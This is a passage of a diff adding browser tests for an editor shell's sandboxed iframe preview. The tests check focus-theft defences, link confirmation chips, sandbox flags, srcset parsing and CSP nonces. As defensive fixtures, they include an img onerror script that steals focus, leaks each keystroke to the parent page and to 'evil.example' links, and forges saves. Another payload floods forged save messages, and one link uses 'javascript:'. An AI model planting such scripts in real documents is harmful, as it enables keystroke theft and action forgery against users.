+    };
+    const frameEl = () => m.root.querySelector('iframe')!;
+    const ready = (channel: string) => { const f = frameOf(m); f.say({ type: 'orz-preview-ready', channel }); return f; };
+    const f = ready('tok');
+    const bridge = (data: unknown) => shellPort!.onmessage!({ data });
+    const lastPing = () => shellPort!.sent.filter((x) => x.type === 'orz-preview-ping').at(-1)?.id as number | undefined;
+    const errors: string[] = [];
+    m.shell.on('error', (e) => errors.push(`${e.source}: ${e.message}`));
+    const paused = () => frameEl().srcdoc.includes('Content-Security-Policy');
+    const first = frameEl();
+    m.ta().focus();
+    f.iframe.focus();
+    bridge({ type: 'orz-preview-focus', reader: true }); // the reader clicked into the preview
+    key(m, m.ta(), 'Tab');
+    bridge({ type: 'orz-preview-focus', reader: false }); // Tab from the page
+    f.say({ type: 'orz-preview-focus', reader: false }); // forged on the window: not the bridge's
+    m.shell.setMode('preview');
+    m.shell.focus();
+    bridge({ type: 'orz-preview-focus', reader: false }); // the shell's own focus()
+    expect([errors, m.root.activeElement === frameEl(), paused(), lastPing()]).toEqual([[], true, false, undefined]);
+    m.ta().focus();
+    await tick(1100);
+    // a press on the iframe element in the page (Chrome sends the click there while the frame cannot be hit yet)
+    const press = (trusted: boolean) => {
+      const ev = new m.win.PointerEvent('pointerdown', { bubbles: true, composed: true }) as unknown as Event;
+      Object.defineProperty(ev, 'isTrusted', { value: trusted });
+      frameEl().dispatchEvent(ev);
+    };
+    press(false); // a script's event in the page: no explanation
+    f.iframe.focus();
+    bridge({ type: 'orz-preview-focus', reader: false });
+    expect([m.root.activeElement === m.ta(), typeof lastPing()]).toEqual([true, 'number']);
+    bridge({ type: 'orz-preview-pong', id: lastPing(), pointer: true }); // (settled: the reader after all)
+    m.ta().focus();
+    await tick(1100);
+    const pings = shellPort!.sent.length;
+    press(true);
+    f.iframe.focus();
+    bridge({ type: 'orz-preview-focus', reader: false });
+    expect([m.root.activeElement === frameEl(), shellPort!.sent.length, paused()]).toEqual([true, pings, false]);
+    m.shell.setMode('split');
+    m.ta().focus();
+    await tick(1100); // the Tab and the grant are no longer fresh
+    // focus without the reader's pointer first: back at once, and the bridge is asked
+    f.iframe.focus();
+    bridge({ type: 'orz-preview-focus', reader: false });
+    expect([m.root.activeElement === m.ta(), paused(), typeof lastPing()]).toEqual([true, false, 'number']);
+    // the bridge answers that the reader's pointerdown followed (Chrome focused the frame first): the reader gets it back
+    f.say({ type: 'orz-preview-pong', id: lastPing(), pointer: false }); // forged on the window: ignored
+    bridge({ type: 'orz-preview-pong', id: lastPing(), pointer: true });
+    expect([m.root.activeElement === frameEl(), paused()]).toEqual([true, false]);
+    // so does a late report of the reader's pointer
+    m.ta().focus();
+    await tick(1100);
+    f.iframe.focus();
+    bridge({ type: 'orz-preview-focus', reader: false });
+    bridge({ type: 'orz-preview-focus', reader: true, late: true });
+    expect([m.root.activeElement === frameEl(), paused()]).toEqual([true, false]);
+    await tick(1100);
+    expect([errors, paused(), frameEl()]).toEqual([[], false, first]); // the question was settled: no timeout, the same frame
+    // a script takes it: the bridge says no pointerdown — the document's frame is replaced by a paused one, and after 0.5 s the note and the error
+    m.ta().focus();
+    await tick(1100);
+    f.iframe.focus();
+    bridge({ type: 'orz-preview-focus', reader: false });
+    bridge({ type: 'orz-preview-pong', id: lastPing(), pointer: false });
+    expect(paused()).toBe(false); // under load the click's pointerdown may still be on its way: 1.2 s
+    await tick(1250);
+    expect([m.root.activeElement === m.ta(), paused(), frameEl() !== first, first.isConnected]).toEqual([true, true, true, false]);
+    expect(frameEl().srcdoc).toMatch(/<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-[0-9a-z]{8,}' 'strict-dynamic'">/);
+    expect(frameEl().getAttribute('sandbox')).toBe('allow-scripts');
+    await tick(560);
+    expect(errors).toEqual(['render: The document\'s scripts took the keyboard focus from the editor: they are paused in the preview.']);
+    expect(m.root.querySelector('[data-orz-paused]')!.textContent).toContain('paused in this preview');
+    // again, from the new frame: focus back again, no second note or error
+    const f2 = ready('tok2');
+    f2.iframe.focus();
+    bridge({ type: 'orz-preview-focus', reader: false });
+    expect([m.root.activeElement === m.ta(), errors.length, m.root.querySelectorAll('[data-orz-paused]').length]).toEqual([true, 1, 1]);
+    m.shell.destroy();
+    // taken again before the question is settled: theft at once (a reader's click does not do that)
+    const r2 = mount();
+    let rPort: { onmessage: ((e: { data: unknown }) => void) | null } | null = null;
+    (r2.win as unknown as Record<string, unknown>).MessageChannel = class { port1 = { onmessage: null, postMessage() {}, close() {} }; port2 = {}; constructor() { rPort = this.port1; } };
+    const h = frameOf(r2);
+    h.say({ type: 'orz-preview-ready', channel: 'tok' });
+    r2.ta().focus();
+    h.iframe.focus();
+    rPort!.onmessage!({ data: { type: 'orz-preview-focus', reader: false } });
+    expect(r2.root.querySelector('iframe')!.srcdoc.includes('Content-Security-Policy')).toBe(false);
+    h.iframe.focus();
+    rPort!.onmessage!({ data: { type: 'orz-preview-focus', reader: false } });
+    expect([r2.root.querySelector('iframe')!.srcdoc.includes('Content-Security-Policy'), r2.root.activeElement === r2.ta()]).toEqual([true, true]);
+    r2.shell.destroy();
+    // no answer from the bridge within 1.5 s: theft
+    const n = mount();
+    let port2: { onmessage: ((e: { data: unknown }) => void) | null } | null = null;
+    (n.win as unknown as Record<string, unknown>).MessageChannel = class { port1 = { onmessage: null, postMessage() {}, close() {} }; port2 = {}; constructor() { port2 = this.port1; } };
+    const g = frameOf(n);
+    g.say({ type: 'orz-preview-ready', channel: 'tok' });
+    n.ta().focus();
+    g.iframe.focus();
+    port2!.onmessage!({ data: { type: 'orz-preview-focus', reader: false } });
+    const nPaused = () => n.root.querySelector('iframe')!.srcdoc.includes('Content-Security-Policy');
+    await tick(1000);
+    expect(nPaused()).toBe(false);
+    await tick(600);
+    expect(nPaused()).toBe(true);
+    n.shell.destroy();
+  });
+
+  it('[E.14] a wheel on the editor counts as the reader touching it although the editor has no focus: the frame\'s "active" and scroll claims within 300 ms do not move it', async () => {
+    const engine = textareaAdapter();
+    const scrollTo = vi.spyOn(engine, 'scrollTo');
+    const m = mount({ adapter: engine });
+    const f = frameOf(m);
+    f.say({ type: 'orz-preview-ready' });
+    m.ta().blur();
+    await tick(350);
+    m.ta().dispatchEvent(new m.win.WheelEvent('wheel', { bubbles: true, deltaY: 40 }) as unknown as Event);
+    f.say({ type: 'orz-preview-active' });
+    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
+    await tick(100);
+    f.say({ type: 'orz-preview-active' });
+    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
+    expect(scrollTo).not.toHaveBeenCalled();
+    await tick(300); // the wheel is 400 ms old: the preview may lead again
+    f.say({ type: 'orz-preview-active' });
+    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
+    expect(scrollTo).toHaveBeenCalled();
+    m.shell.destroy();
+  });
+
+  it('[E.14] a link from the frame never opens a window by itself: without onLink the shell offers it in a chip ("Open <host>?") and opens it only when the reader clicks Open', async () => {
+    const opened: string[] = [];
+    const m = mount();
+    (m.win as unknown as { open: unknown }).open = (u: string) => { opened.push(u); return null; };
+    const f = frameOf(m);
+    f.say({ type: 'orz-preview-ready' });
+    f.iframe.focus();
+    activation(m, true);
+    f.say({ type: 'orz-preview-link', href: 'https://example.org/page' });
+    f.say({ type: 'orz-preview-link', href: 'javascript:alert(1)' });
+    expect(opened).toEqual([]);
+    const chip = m.root.querySelector('.orz-editor__link-chip')!;
+    expect(chip.textContent).toContain('Open example.org?');
+    expect(chip.getAttribute('data-orz-link')).toBe('https://example.org/page');
+    (chip.querySelector('button') as HTMLButtonElement).click();
+    expect(opened).toEqual(['https://example.org/page']);
+    expect(m.root.querySelector('.orz-editor__link-chip')).toBeNull();
+    m.shell.destroy();
+  });
+});
+
+describe('sandbox, srcset, links and includes (round 2: F6, F5, B#12, B#13, B#14)', () => {
+  it('[E.20] standalone needs a top-level window and no host: a connected or framed file: page keeps the opaque frame; the standalone option wins over the inference but allow-same-origin still needs file:, top level and no host', () => {
+    expect(previewSandbox({ host: 'standalone', protocol: 'file:', topLevel: false })).toBe('allow-scripts');
+    expect(previewSandbox({ host: 'standalone', protocol: 'file:', connected: true })).toBe('allow-scripts');
+    expect(previewSandbox({ host: 'standalone', protocol: 'file:', topLevel: true, connected: false })).toBe('allow-scripts allow-same-origin');
+    const sandboxOf = (url: string, opts: Partial<EditorShellOptions>, framed = false) => {
+      const win = new HappyWindow({ url });
+      if (framed) Object.defineProperty(win, 'top', { value: {}, configurable: true });
+      const div = win.document.createElement('div');
+      win.document.body.appendChild(div);
+      const s = createEditorShell(div as unknown as EdElement, { text: '# x', render: () => '', adapter: textareaAdapter(), preview: { assets: false }, ...opts });
+      const v = (s.root as unknown as ShadowRoot).querySelector('iframe')!.getAttribute('sandbox');
+      s.destroy();
+      return v;
+    };
+    const file = 'file:///Users/me/doc.md.html';
+    const host = { connected: () => true, setDirty() {} } as unknown as HostConnection;
+    expect(sandboxOf(file, { assemble: (t) => t })).toBe('allow-scripts allow-same-origin');
+    expect(sandboxOf(file, { assemble: (t) => t, host })).toBe('allow-scripts'); // R5 of round 2
+    expect(sandboxOf(file, { assemble: (t) => t }, true)).toBe('allow-scripts'); // framed
+    expect(sandboxOf(file, { standalone: true, hooks: { save: async () => undefined } })).toBe('allow-scripts allow-same-origin');
+    expect(sandboxOf(file, { standalone: true, host })).toBe('allow-scripts');
+    expect(sandboxOf(file, { standalone: true }, true)).toBe('allow-scripts');
+    expect(sandboxOf(file, { standalone: false, assemble: (t) => t })).toBe('allow-scripts');
+    expect(sandboxOf('https://x.example/doc.md.html', { standalone: true })).toBe('allow-scripts');
+  });
+
+  it('[E.18] srcset is read as the HTML standard reads it: a URL runs to whitespace (commas inside it, as in data: URLs, are part of it), trailing commas end a candidate, descriptors run to a comma outside parentheses', () => {
+    const r = (p: string) => `blob:app/${p}`;
+    expect(rewriteAssetUrls('<img srcset="data:image/png;base64,iVBORw0KGgo= 1x, b.png 2x">', r)).toBe('<img srcset="data:image/png;base64,iVBORw0KGgo= 1x, blob:app/b.png 2x">');
+    expect(rewriteAssetUrls('<img srcset="a,b.png 1x">', r)).toBe('<img srcset="blob:app/a,b.png 1x">');
+    expect(rewriteAssetUrls('<img srcset="a.png,b.png 2x">', r)).toBe('<img srcset="blob:app/a.png,b.png 2x">'); // one URL: no space before the comma's next URL
+    expect(rewriteAssetUrls('<img srcset="a.png, b.png 2x">', r)).toBe('<img srcset="blob:app/a.png, blob:app/b.png 2x">');
+    expect(rewriteAssetUrls('<img srcset="a.png,, b.png 2x,c.png">', r)).toBe('<img srcset="blob:app/a.png,, blob:app/b.png 2x,blob:app/c.png">');
+    expect(mapSrcset('  x.png 100w (junk, more) , y.png', (u) => `[${u}]`)).toBe('  [x.png] 100w (junk, more) , [y.png]');
+  });
+
+  it('[E.12] with hooks.resolveLink the shell asks for links as written (ctx.twinLinks false): renderMarkdownPreview passed as render keeps x.md, and resolveLink gets the source href', async () => {
+    const md2 = 'See [w2](week2.md).\n';
+    expect(renderMarkdownPreview(md2)).toContain('href="week2.md.html"');
+    expect(renderMarkdownPreview(md2, { twinLinks: false })).toContain('href="week2.md"');
+    const ctxs: RenderContext[] = [];
+    const m = mount({ text: md2, render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t, ctx); }, hooks: { resolveLink: (h) => h } });
+    const f = frameOf(m);
+    f.say({ type: 'orz-preview-ready' });
+    await tick(30);
+    expect(ctxs[0].twinLinks).toBe(false);
+    expect(String(f.posted.find((x) => x.type === 'orz-preview-render')!.html)).toContain('href="week2.md"');
+    m.shell.destroy();
+    const plain = mount({ text: md2, render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t, ctx); } });
+    await tick(30);
+    expect(ctxs.at(-1)!.twinLinks).toBeUndefined();
+    plain.shell.destroy();
+  });
+
+  it('[E.12] renderMarkdownPreviewWithIncludes resolves URL includes through ctx.fetchInclude (each URL once per shell cache; a failed one again next time), and keeps the anchors of the lines before and after the include', async () => {
+    const text = '{{nyml\nkind: document\n}}\n\n# Top\n\n{{md https://inc.test/part.md}}\n\nAfter the include.\n';
+    const fetchInclude = vi.fn(async (u: string) => (u.includes('part') ? 'Included **text**.\n\nSecond included paragraph.\n' : null));
+    const cache = new Map<string, unknown>();
+    const html = await renderMarkdownPreviewWithIncludes(text, { fetchInclude, cache });
+    expect(html).toContain('<strong>text</strong>');
+    expect(html).toMatch(/<h1[^>]*data-src-line="4"/);
+    expect(html).toMatch(/<p data-src-line="8">After the include\.<\/p>/);
+    await renderMarkdownPreviewWithIncludes(text, { fetchInclude, cache });
+    expect(fetchInclude).toHaveBeenCalledTimes(1);
+    const failing = '# x\n\n{{md https://inc.test/missing.md}}\n';
+    await renderMarkdownPreviewWithIncludes(failing, { fetchInclude, cache });
+    await renderMarkdownPreviewWithIncludes(failing, { fetchInclude, cache });
+    expect(fetchInclude).toHaveBeenCalledTimes(3);
+    expect(await renderMarkdownPreviewWithIncludes(text)).toBe(renderMarkdownPreview(text)); // no fetchInclude: as before
+    // through the shell, with its per-shell cache
+    const m = mount({ text, render: renderMarkdownPreviewWithIncludes, hooks: { fetchInclude } });
+    const f = frameOf(m);
+    f.say({ type: 'orz-preview-ready' });
+    await tick(60);
+    expect(String(f.posted.find((x) => x.type === 'orz-preview-render')!.html)).toContain('Second included paragraph.');
+    m.shell.destroy();
+  });
+
+  it('[E.19] a nonce is stamped on stylesheet links too, and codemirror6Adapter / loadCodeMirror6 take one: on the bundle\'s <script> and for CodeMirror\'s own <style> (EditorView.cspNonce)', async () => {
+    const full = previewFrameDocument({ nonce: 'n1', head: '<link rel="stylesheet" href="t.css">' });
+    for (const t of full.match(/<link\b[^>]*>/g)!) expect(t).toContain('nonce="n1"');
+    const ctx = page();
+    const appended: Element[] = [];
+    const head = ctx.document.head;
+    const append = head.append.bind(head);
+    head.append = (...nodes: Array<Node | string>) => { appended.push(...nodes.filter((n): n is Element => typeof n !== 'string')); };
+    const p = loadCodeMirror6(ctx.document as unknown as EdDocument, { url: 'https://cdn.example/cm6.js', nonce: 'n2', timeoutMs: 50 });
+    head.append = append;
+    expect(appended.map((n) => [n.tagName, n.getAttribute('nonce'), n.getAttribute('integrity')])).toEqual([['SCRIPT', 'n2', CODEMIRROR6_INTEGRITY]]);
+    await expect(p).rejects.toThrow();
+    expect(readFileSync('src/carrier/editor/codemirror6.ts', 'utf8')).toContain('EditorView.cspNonce.of(options.nonce)');
+  });
+});
+
 // ── E.13 real Chrome ─────────────────────────────────────────────────────
 
 type Browser = import('playwright-core').Browser;
@@ -1444,7 +2142,9 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
 
   beforeAll(async () => {
     const { build } = await import('esbuild');
-    editorJs = (await build({ entryPoints: ['src/carrier/editor/index.ts'], bundle: true, platform: 'browser', format: 'iife', globalName: 'OrzEditor', write: false, logLevel: 'silent' })).outputFiles[0].text;
+    // one KaTeX: an ESM bundle of src resolves `katex/contrib/mhchem` to its .mjs build (importing katex.mjs) while the
+    // KaTeX plugin requires katex.js, so `\ce` would land on the other copy; the CommonJS dist resolves both to katex.js
+    editorJs = (await build({ entryPoints: ['src/carrier/editor/index.ts'], bundle: true, platform: 'browser', format: 'iife', globalName: 'OrzEditor', write: false, logLevel: 'silent', alias: { 'katex/contrib/mhchem': 'katex/dist/contrib/mhchem.js' } })).outputFiles[0].text;
     const server = http.createServer((req, res) => {
       const path = (req.url ?? '/').split('?')[0];
       const js = (body: string) => { res.setHeader('content-type', 'text/javascript; charset=utf-8'); res.setHeader('access-control-allow-origin', '*'); res.end(body); };
@@ -1453,6 +2153,7 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
       if (path === '/cm6.js') return js(cm);
       if (path === '/cm6-tampered.js') return js(`${cm}\n/* one byte more */`);
       if (path === '/cm6-slow.js') { setTimeout(() => js(cm), 2500); return; }
+      if (path === '/slow.css') { setTimeout(() => { res.setHeader('content-type', 'text/css'); res.end('body{color:rgb(0,0,255)}'); }, 6000); return; }
       res.setHeader('content-type', 'text/html; charset=utf-8');
       if (path === '/csp') res.setHeader('content-security-policy', "script-src 'self' 'nonce-abc'");
       res.end('<!doctype html><html><head><meta charset="utf-8"><title>host page</title><style>body{margin:0;font:30px serif;color:red} .box{width:1000px;height:420px} button{background:red}</style></head><body><div id="a" class="box"></div><div id="b" class="box"></div><div id="c" class="box"></div><script src="/editor.js"></script><script src="/app.js"></script></body></html>');
@@ -1534,6 +2235,7 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
       return best;
     })()`)), { timeout: 5000 }).toMatch(/^Line (5[89]|60) of B\.$/); // within one paragraph
     await p.locator('#b iframe').hover();
+    await p.waitForTimeout(400); // the pointer crossed B's editor on its way: past the 300 ms in which the editor leads (E.14)
     await p.mouse.wheel(0, -100000);
     await expect.poll(async () => Number(await p.locator('#b .cm-scroller').evaluate((el) => (el as HTMLElement).scrollTop)), { timeout: 5000 }).toBeLessThan(5);
     // the host page's CSS does not restyle the shell (shadow root)
@@ -1664,7 +2366,7 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
   const TEXT_SAVES = `# Saves\n\n<img src="x" onerror="setInterval(function(){parent.postMessage({type:'orz-preview-key',key:'s'},'*')},40)">\n\nLine 149.\n`;
   const TEXT_FLOOD = `{{nyml\nkind: document\nuid: ${UID_A}\n}}\n\n# Flood\n\n${FLOOD}\n\n${Array.from({ length: 150 }, (_, i) => `Line ${i}.\n`).join('\n')}`;
 
-  it('[E.13] [E.14] a document script that floods Escape, "active", scroll, save, view and link messages while the reader types changes nothing: every keystroke arrives, focus and the scroll stay in the editor, nothing is saved or opened; with focus moved to the frame by a script (no user activation) a forged save still does nothing', async () => {
+  it('[E.13] [E.14] a document script that floods Escape, "active", scroll, save, view and link messages while the reader types changes nothing: every keystroke arrives, focus and the scroll stay in the editor, nothing is saved or opened; with the reader in the frame (focus and activation fresh) its forged saves still do nothing, and the reader\'s own Cmd/Ctrl+S there saves once', async () => {
     const p = await open();
     expect(await p.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_FLOOD)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
     await frameOf(p, 'Line 149.');
@@ -1679,23 +2381,19 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
     expect(await p.evaluate('[window.__saved.a.length, shell_a.getMode()]')).toEqual([0, 'split']);
     expect(p.context().pages()).toHaveLength(1);
     await p.close();
-    // E06: focus stays on the frame, but its user activation has expired (5 s in Chrome): forged saves stop.
-    // (A Playwright evaluate counts as a user gesture too, so the page reads the state with its own timers.
-    // Chrome does not let a script focus a cross-origin frame without activation, so focus comes from a click.)
-    // (a forged Escape would move focus out of the frame — all it can do — so this document forges saves only)
+    // Round 2 (B-15 closed for the default bridge): the bridge's reports come only through its private port, from
+    // trusted events, so with the reader in the frame — focus there, activation fresh — the document's forged saves
+    // still do nothing, while the reader's own Cmd/Ctrl+S there saves once.
     const q = await open();
     await q.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_SAVES)}, ${JSON.stringify(`${A}/cm6.js`)})`);
     await frameOf(q, 'Line 149.');
-    await q.evaluate(`setTimeout(function () {
-      window.__expired = [navigator.userActivation.isActive, shell_a.root.activeElement === shell_a.root.querySelector('iframe'), window.__saved.a.length];
-      setTimeout(function () { window.__later = window.__saved.a.length; }, 1000);
-    }, 6000)`);
-    await q.locator('#a iframe').click({ position: { x: 300, y: 20 } }); // the reader is in the frame: the forged saves act (accepted: FC-19 §8.4)
-    await q.waitForTimeout(7300);
-    const [ua, focused, saves] = (await q.evaluate('window.__expired')) as [boolean, boolean, number];
-    expect([ua, focused]).toEqual([false, true]);
-    expect(saves).toBeGreaterThan(0); // while the click's activation lasted, the frame's save key acted
-    expect(await q.evaluate('window.__later')).toBe(saves); // focus on the frame without activation: no further save
+    await q.locator('#a iframe').click({ position: { x: 300, y: 20 } });
+    await q.waitForTimeout(1500);
+    expect(await q.evaluate('[shell_a.root.activeElement === shell_a.root.querySelector("iframe"), window.__saved.a.length]')).toEqual([true, 0]);
+    await q.keyboard.press('ControlOrMeta+s');
+    await q.waitForFunction('window.__saved.a.length === 1');
+    await q.waitForTimeout(600);
+    expect(await q.evaluate('window.__saved.a.length')).toBe(1);
     expect(q.context().pages()).toHaveLength(1);
     await q.close();
   });
@@ -1908,6 +2606,167 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
     await p.keyboard.press('ControlOrMeta+ArrowDown');
     await p.keyboard.type('open');
     expect(await p.evaluate('shell_c.getText()')).toBe(`${T}open`);
+    await p.close();
+  });
+
+  // ── round 2 of closed loop 2 ──
+  const STEAL = "var i=document.createElement('input');document.body.appendChild(i);document.addEventListener('keydown',function(e){parent.postMessage({stolen:e.key},'*');parent.postMessage({type:'orz-preview-key',key:'s'},'*');parent.postMessage({type:'orz-preview-link',href:'https://evil.example/'+e.key},'*')},true);setInterval(function(){if(document.activeElement!==i)i.focus()},50)";
+  const TEXT_STEAL = `# Doc\n\nHello <img src="x" onerror="${STEAL}">\n`;
+
+  it('[E.13] [E.14] a document script that takes the keyboard focus every 50 ms (and forges a save and a link per stolen key) gets nothing: every key the reader types reaches the editor in order, nothing is saved, no window opens (window.open stubbed, and real), focus stays in the editor, and its scripts are paused in the preview', async () => {
+    for (const stub of [true, false]) {
+      const p = await open();
+      await p.evaluate(`window.__stolen = []; window.__opened = []; ${stub ? 'window.open = function (u) { window.__opened.push(u); return null; };' : ''}
+        window.addEventListener('message', function (e) { if (e.data && e.data.stolen) window.__stolen.push(e.data.stolen); })`);
+      expect(await p.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_STEAL)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
+      await p.waitForTimeout(1000);
+      await p.locator('#a .cm-content').click();
+      await p.keyboard.press('ControlOrMeta+End');
+      await p.waitForTimeout(200);
+      await p.keyboard.type('hello world', { delay: 60 });
+      await p.waitForTimeout(400);
+      const where = stub ? 'window.open stubbed' : 'real window.open';
+      expect(await p.evaluate('shell_a.getText()'), where).toBe(`${TEXT_STEAL}hello world`);
+      expect(await p.evaluate('[window.__stolen.join(""), window.__saved.a.length, window.__opened.length]'), where).toEqual(['', 0, 0]);
+      expect(p.context().pages(), where).toHaveLength(1);
+      expect(await p.evaluate('shell_a.root.activeElement && shell_a.root.activeElement.className'), where).toContain('cm-content');
+      expect(await p.evaluate('[!!shell_a.root.querySelector("[data-orz-paused]"), errors_a.filter(function (e) { return /took the keyboard/.test(e); }).length]'), where).toEqual([true, 1]);
+      await p.close();
+    }
+    // preview-only: after a real click into the (unpaused) preview, Cmd/Ctrl+S there saves
+    const q = await open();
+    await q.evaluate(`mountOpts('a', '# Preview only\\n\\nbody\\n', ${JSON.stringify(`${A}/cm6.js`)})`);
+    await q.evaluate(`shell_a.setMode("preview"); window.__focusLog = [];
+      shell_a.preview.on('orz-preview-focus', function (m) { window.__focusLog.push('focus ' + m.reader + (m.late ? ' late' : '') + ' @' + Math.round(performance.now())); });
+      window.addEventListener('blur', function () { window.__focusLog.push('blur @' + Math.round(performance.now())); });`);
+    await frameOf(q, 'body');
+    await q.locator('#a iframe').click({ position: { x: 300, y: 30 } });
+    await q.keyboard.press('ControlOrMeta+s');
+    await q.waitForFunction('window.__saved.a.length === 1');
+    const state = await q.evaluate('[shell_a.root.activeElement === shell_a.root.querySelector("iframe"), errors_a, shell_a.root.activeElement && shell_a.root.activeElement.className, window.__focusLog]') as [boolean, string[], string, string[]];
+    expect([state[0], state[1]], JSON.stringify(state)).toEqual([true, []]);
+    await q.close();
+  }, 60_000);
+
+  it('[E.13] [E.14] a link the reader clicks in the preview is offered in a chip ("Open <host>?") and opens in a new tab only from the reader\'s click on Open', async () => {
+    const p = await open();
+    await p.evaluate(`mountOpts('a', '# Links\\n\\nSee [the site](https://example.org/page).\\n', ${JSON.stringify(`${A}/cm6.js`)})`);
+    const f = await frameOf(p, 'the site');
+    await p.context().route('https://example.org/**', (r) => r.fulfill({ status: 200, contentType: 'text/html', body: '<title>example</title>' }));
+    await f.locator('a').click();
+    await expect.poll(() => p.evaluate('(function () { var c = shell_a.root.querySelector(".orz-editor__link-chip"); return c ? c.getAttribute("data-orz-link") : null; })()')).toBe('https://example.org/page');
+    expect(p.context().pages()).toHaveLength(1);
+    const [tab] = await Promise.all([p.context().waitForEvent('page'), p.locator('#a .orz-editor__link-chip button').first().click()]);
+    expect(tab.url()).toBe('https://example.org/page');
+    await tab.close();
+    await p.close();
+  });
+
+  it('[E.13] [E.25] a shell mounted into a popup\'s document by the opener\'s script shows its preview (the frame takes the shell\'s messages through its private port, whatever window posted them)', async () => {
+    const p = await open();
+    const [pop] = await Promise.all([p.waitForEvent('popup'), p.evaluate('window.__pop = window.open("about:blank", "x", "width=1000,height=500")')]);
+    await p.evaluate(`(function () {
+      var d = window.__pop.document, host = d.createElement('div');
+      host.style.height = '400px'; d.body.appendChild(host);
+      window.ps = OrzEditor.createEditorShell(host, { text: '# hi\\n\\nfrom the opener\\n', mode: 'preview', render: OrzEditor.renderMarkdownPreview, adapter: OrzEditor.textareaAdapter(), hooks: { save: function () { return Promise.resolve(); } }, preview: { assets: false, debounceMs: 10 } });
+    })()`);
+    let shown = '';
+    await expect.poll(async () => {
+      for (const f of pop.frames()) if (f !== pop.mainFrame()) shown = String(await f.evaluate('document.getElementById("orz-doc") ? document.getElementById("orz-doc").textContent : ""').catch(() => ''));
+      return shown;
+    }, { timeout: 5000 }).toContain('from the opener');
+    await p.evaluate('ps.destroy()');
+    await pop.close();
+    await p.close();
+  });
+
+  it('[E.13] [E.19] a stylesheet that takes 6 s does not hold the preview back: the frame is ready and shows the document at once, and there is no "could not start" error', async () => {
+    const p = await open();
+    await p.evaluate(`mountOpts('a', '# Slow theme\\n\\nshown at once\\n', ${JSON.stringify(`${A}/cm6.js`)}, { preview: { readyTimeoutMs: 3000, head: '<link rel="stylesheet" href="${A}/slow.css">' } })`);
+    const t0 = Date.now();
+    const f = await frameOf(p, 'shown at once');
+    expect(Date.now() - t0).toBeLessThan(2500);
+    await p.waitForTimeout(3500);
+    expect(await p.evaluate('[errors_a.length, shell_a.root.querySelector(".orz-editor__preview-note")]')).toEqual([0, null]);
+    await expect.poll(() => f.evaluate('getComputedStyle(document.body).color'), { timeout: 8000 }).toBe('rgb(0, 0, 255)');
+    await p.close();
+  }, 30_000);
+
+  it('[E.13] [E.25] a carrier\'s frame document customises the default bridge with page hooks: __orzPreviewApply (async) draws each render and is acknowledged when it settles, __orzPreviewNavigate gets the navigate line, __orzPreviewMessage gets shell.preview.post, and shell.preview.on hears __orzPreview.post', async () => {
+    const p = await open();
+    await p.evaluate(`window.__heard = []; mountOpts('a', '# One\\n\\n---\\n\\n# Two\\n', ${JSON.stringify(`${A}/cm6.js`)}, { preview: { mode: 'navigate', frameDocument: function (parts) {
+      return '<!doctype html><html><head>' + parts.bridge + parts.head + '</head><body><main id="deck"></main><script>' +
+        'window.__applied = 0; window.__navs = []; window.__msgs = [];' +
+        'window.__orzPreviewApply = function (html) { return new Promise(function (r) { setTimeout(function () { document.getElementById("deck").innerHTML = html; window.__applied++; r(); }, 120); }); };' +
+        'window.__orzPreviewNavigate = function (line) { window.__navs.push(line); window.__orzPreview.post({ type: "x-deck-at", line: line }); };' +
+        'window.__orzPreviewMessage = function (m) { window.__msgs.push(m.type); };' +
+        '</' + 'script></body></html>';
+    } } })`);
+    await p.evaluate('shell_a.preview.on("x-deck-at", function (m) { window.__heard.push(m.line); })');
+    const f = await (async () => { for (let i = 0; i < 100; i++) { for (const x of p.frames()) { if (x !== p.mainFrame() && await x.evaluate('window.__applied || 0').catch(() => 0)) return x; } await p.waitForTimeout(50); } throw new Error('no frame'); })();
+    expect(await f.evaluate('document.getElementById("deck").textContent')).toContain('Two');
+    await p.evaluate('shell_a.focus(); shell_a.adapter.setSelection({ from: 10, to: 10 })');
+    await expect.poll(() => f.evaluate('window.__navs.slice(-1)[0]')).toBe(2);
+    await expect.poll(() => p.evaluate('window.__heard.slice(-1)[0]')).toBe(2);
+    expect(await p.evaluate('shell_a.preview.post({ type: "x-deck-go", delta: 1 })')).toBe(true);
+    await expect.poll(() => f.evaluate('window.__msgs.join(",")')).toBe('x-deck-go');
+    await p.close();
+  });
+
+  it('[E.13] [E.21] CodeMirror arriving after 200 textarea steps of a 1.25 MB document replays only the newest 100 (it was every step: 20.9 s and 586 MB) and undo walks them back exactly', async () => {
+    let big = readFileSync('tests/carrier-corpus/md/large.md', 'utf8');
+    while (big.length < 1_250_000) big += big;
+    big = big.slice(0, 1_250_000);
+    const p = await open();
+    await p.addScriptTag({ url: `${A}/cm6.js` });
+    await p.evaluate((text) => {
+      const E = (window as unknown as { OrzEditor: Record<string, (...a: unknown[]) => unknown> }).OrzEditor;
+      const w = window as unknown as Record<string, unknown>;
+      let open!: () => void;
+      const gate = new Promise<void>((r) => { open = r; });
+      w.__open = open;
+      w.shell_c = E.createEditorShell(document.getElementById('c'), { text, mode: 'editor', render: () => '', hooks: { save: () => Promise.resolve() },
+        adapter: E.codemirror6Adapter({ loadModules: async () => { await gate; return w.OrzCodeMirror6; } }), preview: { assets: false } });
+    }, big);
+    const states = await p.evaluate((n) => {
+      const w = window as unknown as Record<string, { root: ShadowRoot; getText(): string }>;
+      const ta = w.shell_c.root.querySelector('textarea')!;
+      const real = Date.now;
+      let fake = real();
+      Date.now = () => (fake += 1000); // every input its own undo step
+      const out: string[] = [];
